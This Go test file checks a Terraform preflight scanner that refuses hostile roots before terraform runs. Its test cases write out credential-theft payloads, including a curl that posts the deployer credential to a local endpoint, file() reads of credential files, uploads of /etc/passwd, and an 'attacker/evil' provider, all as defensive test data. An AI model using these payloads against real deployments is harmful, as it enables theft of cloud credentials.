package managed

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/dimipaun/fugaro/internal/infra"
	"github.com/dimipaun/fugaro/internal/infra/tf"
	"github.com/dimipaun/fugaro/internal/initflow"
)

// The independent review of Task 3.1 (round 1) wrote eight roots that the
// first preflight let through to terraform init, each of which then ran
// something with the deployer's credential before the gate had a plan to read.
// Every one is refused now, before any terraform runs.
func TestPreflightRefusesTheReviewersEightRoots(t *testing.T) {
	// The nested-quote interpolation the first lexer read as two strings and
	// an extra {, which put the next top-level block at the wrong depth.
	const desync = "locals {\n  a = \"${\"{\"}\"\n}\n"
	for _, tc := range []struct {
		name  string
		files map[string]string
	}{
		{"desync: a top-level ephemeral after a nested-quote interpolation", map[string]string{
			"main.tf": desync + "ephemeral \"google_secret_manager_secret_version\" \"v\" {\n  secret = \"x\"\n}\n",
		}},
		{"desync: a backend after a nested-quote interpolation", map[string]string{
			"main.tf": desync + "terraform {\n  backend \"gcs\" {\n    bucket = \"b\"\n  }\n}\n",
		}},
		{"desync: an override file's backend", map[string]string{
			"main.tf":       "resource \"google_storage_bucket\" \"b\" {\n  name = \"x\"\n}\n",
			"x_override.tf": desync + "terraform {\n  backend \"gcs\" {\n    storage_custom_endpoint = \"http://127.0.0.1:18089/storage/v1/\"\n  }\n}\n",
		}},
		{"a duplicate terraform key hiding a backend", map[string]string{
			"main.tf.json": `{"terraform":{"backend":{"gcs":{"bucket":"b","storage_custom_endpoint":"http://127.0.0.1:18089/storage/v1/"}}},"terraform":{}}`,
		}},
		{"a duplicate terraform key hiding provider_meta", map[string]string{
			"main.tf.json": `{"terraform":{"provider_meta":{"google":{"module_name":"x"}}},"terraform":{}}`,
		}},
		{"a duplicate module key hiding a local module", map[string]string{
			"main.tf.json": `{"module":{"m":{"source":"./m"}},"module":{}}`,
			"m/main.tf":    "data \"external\" \"x\" {\n  program = [\"sh\", \"-c\", \"cat ../fugaro_deployer_credentials.json\"]\n}\n",
		}},
		{"a data external", map[string]string{
			"main.tf": "data \"external\" \"x\" {\n  program = [\"sh\", \"-c\", \"curl -d @$GOOGLE_APPLICATION_CREDENTIALS http://127.0.0.1:18089\"]\n}\n",
		}},
		{"a foreign provider", map[string]string{
			"main.tf": "terraform {\n  required_providers {\n    evil = {\n      source = \"attacker/evil\"\n    }\n  }\n}\nprovider \"evil\" {}\n",
		}},
		{"file() of the deployer's credential", map[string]string{
			"main.tf": "locals {\n  c = file(\"../fugaro_deployer_credentials.json\")\n}\nresource \"google_storage_bucket\" \"b\" {\n  name   = \"x\"\n  labels = { c = local.c }\n}\n",
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := newApplyRig(t, tc.files)
			r.planWithChanges(t, bucket(planBucket))
			_, err := Apply(context.Background(), r.request(t))
			if !errors.Is(err, ErrPreflight) {
				t.Fatalf("got %v, want the preflight's refusal", err)
			}
			if calls := r.calls(t); len(calls) != 0 {
				t.Errorf("the refused root ran terraform: %v", calls)
			}
			if creds := r.credsUsed(); len(creds) != 0 {
				t.Errorf("the refused root assumed the deployer: %v", creds)
			}
		})
	}
}

// refusedRoots are roots the preflight refuses, one rule each, with a word the
// refusal must carry so a row cannot pass on another row's rule.
var refusedRoots = []struct {
	name  string
	files map[string]string
	want  string
}{
	// Desynchronisation: nested quotes, heredocs, escapes.
	{"a nested quote inside a heredoc's interpolation", map[string]string{"main.tf": "locals {\n  a = <<EOT\n${\"}\"}\nEOT\n}\ndata \"external\" \"x\" {}\n"}, "data source"},
	{"an interpolation in a heredoc hiding its own end tag", map[string]string{"main.tf": "locals {\n  a = <<EOT\n${\"x\"}EOT\nEOT\n}\ndata \"external\" \"x\" {}\n"}, "data source"},
	{"a $${ escape", map[string]string{"main.tf": "locals {\n  a = \"$${x}\"\n}\n"}, ""},
	{"a %%{ escape", map[string]string{"main.tf": "locals {\n  a = \"%%{x}\"\n}\n"}, ""},
	{"an escape HCL does not define", map[string]string{"main.tf": "locals {\n  a = \"\\${file(\\\"x\\\")}\"\n}\n"}, ""},
	{"a non-ASCII identifier", map[string]string{"main.tf": "locals {\n  é = 1\n}\n"}, ""},
	{"a newline inside a quoted string's interpolation", map[string]string{"main.tf": "locals {\n  a = \"${\nupper(\"x\")}\"\n}\n"}, "past the end of its line"},
	{"an unclosed interpolation", map[string]string{"main.tf": "locals {\n  a = \"${x\"\n}\n"}, ""},
	{"a heredoc whose end tag is the last line with no newline", map[string]string{"main.tf": "locals {\n  a = <<EOT\nx\nEOT"}, ""},
	// Override files, by every name terraform reads as one.
	{"override.tf", map[string]string{"override.tf": "locals {}\n"}, "override file"},
	{"override.tf.json", map[string]string{"override.tf.json": "{}"}, "override file"},
	{"x_override.tf", map[string]string{"x_override.tf": "locals {}\n"}, "override file"},
	{"x_override.tf.json", map[string]string{"x_override.tf.json": "{}"}, "override file"},
	{"an override file in a local module", map[string]string{"main.tf": "module \"m\" {\n  source = \"./m\"\n}\n", "m/a_override.tf": "locals {}\n"}, "override file"},
	// Duplicate keys, at any depth.
	{"a duplicate key deep in a resource", map[string]string{"main.tf.json": `{"resource":{"google_storage_bucket":{"b":{"name":"x","name":"y"}}}}`}, ""},
	{"a duplicate key spelt with an escape", map[string]string{"main.tf.json": `{"terraform":{},"terraform":{"backend":{"gcs":{}}}}`}, ""},
	// Data sources, anywhere terraform reads one.
	{"a data source of Google's own", map[string]string{"main.tf": "data \"google_client_config\" \"c\" {}\n"}, "data source"},
	{"a data source inside a check", map[string]string{"main.tf": "check \"c\" {\n  data \"http\" \"x\" {\n    url = \"http://127.0.0.1:18089\"\n  }\n  assert {\n    condition     = true\n    error_message = \"x\"\n  }\n}\n"}, "data source"},
	{"a JSON data source", map[string]string{"main.tf.json": `{"data":{"external":{"x":{"program":["sh"]}}}}`}, "data source"},
	{"a JSON data source inside a check", map[string]string{"main.tf.json": `{"check":{"c":{"data":{"http":{"x":{"url":"http://x"}}}}}}`}, "data source"},
	// Providers.
	{"google's name for another source", map[string]string{"main.tf": "terraform {\n  required_providers {\n    google = {\n      source = \"attacker/google\"\n    }\n  }\n}\n"}, "source"},
	{"a computed key in a requirement", map[string]string{"main.tf": "terraform {\n  required_providers {\n    google = {\n      (local.k) = \"attacker/google\"\n    }\n  }\n}\n"}, "not an object of literal keys"},
	{"a JSON foreign provider", map[string]string{"main.tf.json": `{"terraform":{"required_providers":{"evil":{"source":"attacker/evil"}}}}`}, "hashicorp/google"},
	{"a provider block with a custom endpoint", map[string]string{"main.tf": "provider \"google\" {\n  storage_custom_endpoint = \"http://127.0.0.1:18089/storage/v1/\"\n}\n"}, "storage_custom_endpoint"},
	{"a provider block with a credential", map[string]string{"main.tf": "provider \"google\" {\n  access_token = \"x\"\n}\n"}, "access_token"},
	{"a provider block with an alias", map[string]string{"main.tf": "provider \"google\" {\n  alias = \"x\"\n}\n"}, "alias"},
	{"a JSON provider block with a custom endpoint", map[string]string{"main.tf.json": `{"provider":{"google":{"storage_custom_endpoint":"http://x"}}}`}, "storage_custom_endpoint"},
	{"an implied foreign provider (a resource of another type)", map[string]string{"main.tf": "resource \"local_file\" \"f\" {\n  filename = \"x\"\n}\n"}, "google_*"},
	{"a resource handed a foreign provider", map[string]string{"main.tf": "resource \"google_storage_bucket\" \"b\" {\n  provider = external\n  name     = \"x\"\n}\n"}, "not google or google-beta"},
	{"a module handed a foreign provider", map[string]string{"main.tf": "module \"m\" {\n  source    = \"./m\"\n  providers = { google = external }\n}\n", "m/main.tf": "locals {}\n"}, "providers map"},
	{"the root's own lock file", map[string]string{"main.tf": "locals {}\n", ".terraform.lock.hcl": "provider \"registry.terraform.io/attacker/evil\" {}\n"}, "lock file"},
	{"a local state file", map[string]string{"main.tf": "locals {}\n", "terraform.tfstate": "{}"}, "state"},
	// Functions and paths.
	{"templatefile()", map[string]string{"main.tf": "locals {\n  a = templatefile(\"x.tpl\", {})\n}\n"}, "templatefile"},
	{"filebase64sha256()", map[string]string{"main.tf": "locals {\n  a = filebase64sha256(\"x\")\n}\n"}, "filebase64sha256"},
	{"fileexists() across a newline in a list", map[string]string{"main.tf": "locals {\n  a = [\n    fileexists\n    (\"x\"),\n  ]\n}\n"}, "fileexists"},
	{"templatestring()", map[string]string{"main.tf": "locals {\n  a = templatestring(local.t, {})\n}\n"}, "templatestring"},
	{"pathexpand()", map[string]string{"main.tf": "locals {\n  a = pathexpand(\"~/.config/gcloud/application_default_credentials.json\")\n}\n"}, "pathexpand"},
	{"abspath()", map[string]string{"main.tf": "locals {\n  a = abspath(\".\")\n}\n"}, "abspath"},
	{"core::file()", map[string]string{"main.tf": "locals {\n  a = core::file(\"x\")\n}\n"}, "namespaced"},
	{"a provider-defined function", map[string]string{"main.tf": "locals {\n  a = provider::google::region_from_zone(\"x\")\n}\n"}, "namespaced"},
	{"a function terraform does not carry", map[string]string{"main.tf": "locals {\n  a = env(\"HOME\")\n}\n"}, "env()"},
	{"file() inside an interpolation", map[string]string{"main.tf": "locals {\n  a = \"x-${file(\"y\")}\"\n}\n"}, "file()"},
	{"file() inside a heredoc", map[string]string{"main.tf": "locals {\n  a = <<-EOT\n    ${file(\"y\")}\n  EOT\n}\n"}, "file()"},
	{"a path.* reference", map[string]string{"main.tf": "locals {\n  a = \"${path.module}/../x\"\n}\n"}, "path.*"},
	{"path.cwd", map[string]string{"main.tf": "locals {\n  a = path.cwd\n}\n"}, "path.*"},
	{"file() in a JSON template", map[string]string{"main.tf.json": `{"locals":{"a":"${file(\"../fugaro_deployer_credentials.json\")}"}}`}, "file()"},
	{"core::file() in a JSON template", map[string]string{"main.tf.json": `{"locals":{"a":"${core::file(\"x\")}"}}`}, "namespaced"},
	{"file() in a JSON key", map[string]string{"main.tf.json": `{"locals":{"a":{"${file(\"x\")}":1}}}`}, "file()"},
	{"file() as a JSON bare expression", map[string]string{"main.tf.json": `{"resource":{"google_storage_bucket":{"b":{"name":"x","lifecycle":{"replace_triggered_by":["file(\"x\")"]}}}}}`}, "file()"},
	// Provider arguments that read the applier's disk.
	{"a bucket object uploaded from a local file", map[string]string{"main.tf": "resource \"google_storage_bucket_object\" \"o\" {\n  bucket = \"fmgd-b\"\n  name   = \"o\"\n  source = \"/home/op/.config/gcloud/application_default_credentials.json\"\n}\n"}, "source argument"},
	{"a JSON bucket object uploaded from a local file", map[string]string{"main.tf.json": `{"resource":{"google_storage_bucket_object":{"o":{"bucket":"fmgd-b","name":"o","source":"/etc/passwd"}}}}`}, "source argument"},
	// Modules.
	{"a registry module", map[string]string{"main.tf": "module \"m\" {\n  source = \"terraform-google-modules/network/google\"\n}\n"}, "not a local path"},
	{"a git module", map[string]string{"main.tf": "module \"m\" {\n  source = \"git::https://example.com/m.git\"\n}\n"}, "not a local path"},
	{"a module source that is not a literal", map[string]string{"main.tf": "module \"m\" {\n  source = \"./${local.x}\"\n}\n"}, "literal"},
	{"a JSON module with no source", map[string]string{"main.tf.json": `{"module":{"m":{}}}`}, "literal source"},
	{"a module that leaves the root", map[string]string{"main.tf": "module \"m\" {\n  source = \"../../outside\"\n}\n"}, "outside the root"},
	// Provisioners, written out or generated.
	{"a provisioner in a removed block", map[string]string{"main.tf": "removed {\n  from = google_storage_bucket.b\n  provisioner \"local-exec\" {\n    when    = destroy\n    command = \"x\"\n  }\n}\n"}, "provisioner"},
	{"a dynamic provisioner", map[string]string{"main.tf": "resource \"google_storage_bucket\" \"b\" {\n  name = \"x\"\n  dynamic \"provisioner\" {\n    for_each = []\n    content {}\n  }\n}\n"}, "provisioner"},
	{"a JSON provisioner", map[string]string{"main.tf.json": `{"resource":{"google_storage_bucket":{"b":{"name":"x","provisioner":{"local-exec":{"command":"x"}}}}}}`}, "provisioner"},
	// Blocks terraform has and a managed root does not.
	{"an unknown top-level block", map[string]string{"main.tf": "list \"google_storage_bucket\" \"x\" {}\n"}, "does not declare"},
	{"a terraform setting beyond the two", map[string]string{"main.tf": "terraform {\n  experiments = []\n}\n"}, "experiments"},
}

// Every rule of the preflight, row by row, and each refusal says which rule
// made it.
func TestPreflightRefusesWhatWouldRunBeforeTheGate(t *testing.T) {
	for _, tc := range refusedRoots {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			for name, body := range tc.files {
				writeFile(t, filepath.Join(dir, name), body)
			}
			res, err := scanRoot(dir)
			if err != nil {
				if tc.want != "" && !strings.Contains(err.Error(), tc.want) {
					t.Errorf("refused with %v, which does not name %q", err, tc.want)
				}
				return
			}
			if len(res.bad) == 0 {
				t.Fatalf("the root was admitted: %v", tc.files)
			}
			if all := strings.Join(res.bad, "; "); tc.want != "" && !strings.Contains(all, tc.want) {
				t.Errorf("refused with %s, which does not name %q", all, tc.want)
			}
		})
	}
}

// ordinaryRoot is a root the preflight admits, written to exercise the
// scanner: nested quotes, heredocs with interpolations and directives, a for
// expression, a variable's type constraint, a function of the allowlist, both
// Google providers, a local module and a JSON file with comments.
func ordinaryRoot() map[string]string {
	return map[string]string{
		"versions.tf": "terraform {\n  required_version = \">= 1.7.0\"\n  required_providers {\n    google = {\n      source  = \"hashicorp/google\"\n      version = \">= 8.4.0, < 9.0.0\"\n    }\n    google-beta = {\n      source  = \"registry.terraform.io/hashicorp/google-beta\"\n      version = \">= 8.4.0, < 9.0.0\"\n    }\n  }\n}\n",
		"main.tf": "# backend \"s3\" {}\n/* data \"external\" \"x\" {} */\nprovider \"google\" {\n  project = \"" + gcpProject + "\"\n  region  = var.region\n}\n" +
			"variable \"region\" {\n  type    = string\n  default = \"us-east5\"\n}\n" +
			"variable \"opts\" {\n  type = object({\n    a = optional(list(string), [])\n    b = map(number)\n  })\n  default = { b = {} }\n}\n" +
			"locals {\n  a = \"${\"{\"}\"\n  b = \"${\"}\"}x\"\n  c = <<-EOT\n    ${upper(\"x\")} }\n    ${upper(\"y\")} EOT\n    %{ if true }yes%{ endif }\n    EOTX\n  EOT\n  d = [for k, v in { x = 1 } : \"${k}=${v}\" if v > 0]\n  e = \"file(x) is prose in a string\"\n  f = jsonencode({ path = \"p\" })\n  g = \"\\u00e9 \\\"q\\\" \\\\\"\n  h = 1.5e3\n}\n" +
			"resource \"google_storage_bucket\" \"data\" {\n  name     = \"fmgd-data\"\n  location = \"US\"\n  labels   = { a = lower(local.a) }\n  lifecycle {\n    prevent_destroy = false\n  }\n}\n" +
			"resource \"google_storage_bucket\" \"beta\" {\n  provider = google-beta\n  name     = \"fmgd-beta\"\n  location = \"US\"\n}\n" +
			"resource \"google_project_service\" \"one\" { service = \"storage.googleapis.com\" }\n" +
			"module \"m\" {\n  source    = \"./modules/m\"\n  providers = { google = google }\n}\n" +
			"import {\n  to = google_storage_bucket.data\n  id = \"" + gcpProject + "/fmgd-data\"\n}\nmoved {\n  from = google_storage_bucket.old\n  to   = google_storage_bucket.data\n}\n" +
			"check \"c\" {\n  assert {\n    condition     = length(local.d) > 0\n    error_message = \"x\"\n  }\n}\n" +
			"output \"o\" {\n  value = google_storage_bucket.data.name\n}\n",
		"extra.tf.json":      `{"//": "a comment", "resource": {"google_storage_bucket": {"j": {"name": "${lower(\"J\")}", "location": "US"}}}, "locals": {"p": "Bucket (prod)"}}`,
		"modules/m/main.tf":  "resource \"google_storage_bucket\" \"inner\" {\n  name     = \"fmgd-inner\"\n  location = \"US\"\n}\n",
		"modules/m/notes.md": "data \"external\" \"x\" {}\n",
	}
}

// The ordinary root is admitted, and the providers it uses decide the lock.
func TestPreflightAdmitsAnOrdinaryRoot(t *testing.T) {
	dir := t.TempDir()
	for name, body := range ordinaryRoot() {
		writeFile(t, filepath.Join(dir, name), body)
	}
	res, err := scanRoot(dir)
	if err != nil {
		t.Fatalf("scanRoot: %v", err)
	}
	if len(res.bad) != 0 {
		t.Fatalf("an ordinary root was refused: %s", strings.Join(res.bad, "\n"))
	}
	want := []string{"registry.terraform.io/hashicorp/google", "registry.terraform.io/hashicorp/google-beta"}
	if got := res.providers(); !slices.Equal(got, want) {
		t.Errorf("providers %v, want %v", got, want)
	}
}

// The lexer reads a nested-quote interpolation as one string — the case the
// first lexer desynchronised on — and a heredoc's interpolation as tokens.
func TestLexerReadsTemplatesAsHCLDoes(t *testing.T) {
	toks, err := lexHCL([]byte("a = \"${\"{\"}\"\n"))
	if err != nil {
		t.Fatal(err)
	}
	var kinds []tkind
	for _, tk := range toks {
		kinds = append(kinds, tk.kind)
	}
	want := []tkind{tIdent, tPunct, tTmplOpen, tInterpOpen, tString, tInterpClose, tTmplClose, tNewline, tEOF}
	if !slices.Equal(kinds, want) {
		t.Errorf("tokens %v, want %v", kinds, want)
	}
	body, err := parseHCL([]byte("locals {\n  a = <<EOT\n${\"}\"}\n  EOT\n}\nterraform {\n  required_version = \">= 1\"\n}\n"))
	if err != nil {
		t.Fatal(err)
	}
	if len(body.blocks) != 2 || body.blocks[1].typ != "terraform" {
		t.Errorf("the heredoc desynchronised the blocks: %+v", body.blocks)
	}
}

// The lock file terraform runs with is this command's own: the embedded
// entries of exactly the providers the root uses (terraform refuses a
// read-only lock that carries one it does not require).
func TestApplyWritesItsOwnLockFile(t *testing.T) {
	for _, tc := range []struct {
		name  string
		files map[string]string
		want  []string
	}{
		{"google alone", plainRoot(), []string{"registry.terraform.io/hashicorp/google"}},
		{"google-beta alone", map[string]string{"main.tf": "resource \"google_storage_bucket\" \"b\" {\n  provider = google-beta\n  name     = \"x\"\n}\n"}, []string{"registry.terraform.io/hashicorp/google-beta"}},
		{"both", ordinaryRoot(), []string{"registry.terraform.io/hashicorp/google", "registry.terraform.io/hashicorp/google-beta"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := newApplyRig(t, tc.files)
			r.planWithChanges(t, bucket(planBucket))
			if _, err := Apply(context.Background(), r.request(t)); err != nil {
				t.Fatalf("Apply: %v", err)
			}
			b, err := os.ReadFile(filepath.Join(r.wd.Root, infra.LockFile))
			if err != nil {
				t.Fatal(err)
			}
			var got []string
			for _, l := range strings.Split(string(b), "\n") {
				if a, ok := strings.CutPrefix(l, "provider \""); ok {
					got = append(got, strings.TrimSuffix(a, "\" {"))
				}
			}
			if !slices.Equal(got, tc.want) {
				t.Errorf("the lock names %v, want %v", got, tc.want)
			}
			if !strings.Contains(string(b), "h1:") {
				t.Error("the lock carries no hashes")
			}
		})
	}
}

// The deployer's credential file is there for every terraform the apply runs
// — init, plan, the show the gate reads, the apply — and is removed exactly
// once on every way out: a success, a refused gate, a failed plan, and a
// panic.
func TestApplyKeepsTheCredentialForEveryTerraformAndRemovesItAfter(t *testing.T) {
	t.Run("a success", func(t *testing.T) {
		r := newApplyRig(t, plainRoot())
		r.planWithChanges(t, bucket(planBucket))
		if _, err := Apply(context.Background(), r.request(t)); err != nil {
			t.Fatalf("Apply: %v", err)
		}
		at := r.credentialsAtEachCall(t)
		for _, sub := range []string{"init", "plan", "show", "apply"} {
			if have, ran := at[sub]; !ran || !have {
				t.Errorf("terraform %s: ran %v, credential file there %v — it must be there for every call", sub, ran, have)
			}
		}
		r.assertCleanedUp(t)
	})
	t.Run("a refused gate", func(t *testing.T) {
		r := newApplyRig(t, plainRoot())
		r.planWithChanges(t, bucket(planBucket))
		req := r.request(t)
		req.Cover = refuseAll{}
		if _, err := Apply(context.Background(), req); err == nil {
			t.Fatal("a refused plan was applied")
		}
		r.assertCleanedUp(t)
	})
	t.Run("a failed plan", func(t *testing.T) {
		r := newApplyRig(t, plainRoot())
		r.script["plan"] = map[string]any{"exit": 1, "stderr": "boom"}
		if _, err := Apply(context.Background(), r.request(t)); err == nil {
			t.Fatal("a failed plan was applied")
		}
		r.assertCleanedUp(t)
	})
	t.Run("a refused confirmation", func(t *testing.T) {
		r := newApplyRig(t, plainRoot())
		r.planWithChanges(t, bucket(planBucket))
		req := r.request(t)
		req.Ask = func(string) (bool, error) { return false, nil }
		if _, err := Apply(context.Background(), req); !errors.Is(err, ErrNotConfirmed) {
			t.Fatalf("got %v, want the refused confirmation", err)
		}
		r.assertCleanedUp(t)
	})
	t.Run("a panic", func(t *testing.T) {
		r := newApplyRig(t, plainRoot())
		r.planWithChanges(t, bucket(planBucket))
		req := r.request(t)
		req.Cover = panicCover{}
		func() {
			defer func() {
				if recover() == nil {
					t.Error("the cover's panic did not reach the caller")
				}
			}()
			_, _ = Apply(context.Background(), req)
		}()
		r.assertCleanedUp(t)
	})
}

// assertCleanedUp: one cleanup ran, and every credential file is gone.
func (r *applyRig) assertCleanedUp(t *testing.T) {
	t.Helper()
	if n := r.cleanupsRun(); n != 1 {
		t.Errorf("the credential cleanup ran %d time(s), want exactly once", n)
	}
	r.mu.Lock()
	files := slices.Clone(r.credFiles)
	r.mu.Unlock()
	if len(files) == 0 {
		t.Error("no credential file was ever written")
	}
	for _, f := range files {
		if _, err := os.Stat(f); !errors.Is(err, os.ErrNotExist) {
			t.Errorf("the credential file %s outlived the apply", f)
		}
	}
}

// refuseAll is a cover that refuses every plan.
type refuseAll struct{}

func (refuseAll) NotCovered(*tf.Plan, []tf.ImportKey) []string { return []string{"everything"} }

// panicCover is a cover that panics, the way a bug would.
type panicCover struct{}

func (panicCover) NotCovered(*tf.Plan, []tf.ImportKey) []string { panic("a cover bug") }

// A person at a terminal is asked, with the project, the plan's hash and its
// counts in the question, and only a yes applies; a coding agent's session in
// a managed project is not asked (D55), and a person's session with nothing to
// ask is refused rather than applied unasked.
func TestApplyAsksThePersonAtTheTerminal(t *testing.T) {
	t.Run("the question names the plan", func(t *testing.T) {
		r := newApplyRig(t, plainRoot())
		r.planWithChanges(t, bucket(planBucket))
		res, err := Apply(context.Background(), r.request(t))
		if err != nil {
			t.Fatalf("Apply: %v", err)
		}
		if len(r.asked) != 1 {
			t.Fatalf("asked %d question(s), want one", len(r.asked))
		}
		q := r.asked[0]
		for _, want := range []string{project, res.PlanHash, "1 to create", "0 to delete"} {
			if !strings.Contains(q, want) {
				t.Errorf("the question %q does not name %q", q, want)
			}
		}
	})
	t.Run("a no applies nothing", func(t *testing.T) {
		r := newApplyRig(t, plainRoot())
		r.planWithChanges(t, bucket(planBucket))
		req := r.request(t)
		req.Ask = func(string) (bool, error) { return false, nil }
		if _, err := Apply(context.Background(), req); !errors.Is(err, ErrNotConfirmed) {
			t.Fatalf("got %v, want the refused confirmation", err)
		}
		if applied := r.applied(t); len(applied) != 0 {
			t.Errorf("an unconfirmed plan was applied: %v", applied)
		}
	})
	t.Run("an error asking applies nothing", func(t *testing.T) {
		r := newApplyRig(t, plainRoot())
		r.planWithChanges(t, bucket(planBucket))
		req := r.request(t)
		req.Ask = func(string) (bool, error) { return true, errors.New("stdin closed") }
		if _, err := Apply(context.Background(), req); !errors.Is(err, ErrNotConfirmed) {
			t.Fatalf("got %v, want the refused confirmation", err)
		}
		if applied := r.applied(t); len(applied) != 0 {
			t.Errorf("a plan was applied on an error: %v", applied)
		}
	})
	t.Run("nothing to ask with", func(t *testing.T) {
		r := newApplyRig(t, plainRoot())
		r.planWithChanges(t, bucket(planBucket))
		req := r.request(t)
		req.Ask = nil
		if _, err := Apply(context.Background(), req); !errors.Is(err, ErrNotConfirmed) {
			t.Fatalf("got %v, want the refused confirmation", err)
		}
		if applied := r.applied(t); len(applied) != 0 {
			t.Errorf("a plan was applied unasked: %v", applied)
		}
	})
	t.Run("a coding agent's session is not asked", func(t *testing.T) {
		r := newApplyRig(t, plainRoot())
		r.planWithChanges(t, bucket(planBucket))
		req := r.request(t)
		req.Conditions = initflow.Conditions{Agent: "CLAUDECODE"}
		if _, err := Apply(context.Background(), req); err != nil {
			t.Fatalf("Apply: %v", err)
		}
		if len(r.asked) != 0 {
			t.Errorf("a coding agent's session was asked %v", r.asked)
		}
	})
}
